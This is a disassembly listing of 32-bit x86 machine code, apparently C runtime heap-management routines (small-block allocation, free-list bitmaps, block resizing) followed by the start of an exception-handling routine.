  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
